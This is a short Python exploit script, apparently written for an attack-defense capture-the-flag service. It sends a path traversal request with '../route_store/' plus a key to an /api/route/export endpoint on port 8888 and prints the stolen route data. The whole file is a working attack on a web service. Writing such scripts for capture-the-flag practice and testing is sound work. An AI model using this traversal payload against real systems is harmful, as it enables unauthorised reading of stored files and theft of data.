#!/usr/bin/env python3
"""vuln 1: path traversal в /api/route/export. attack data = route key."""
from lib import args, emit, fail, http

host, key = args(1)
st, body = http(host, 8888, "GET", "/api/route/export?path=../route_store/" + key)
if st != 200:
    fail("HTTP %s" % st)
emit(body.decode("utf-8", "replace").strip())
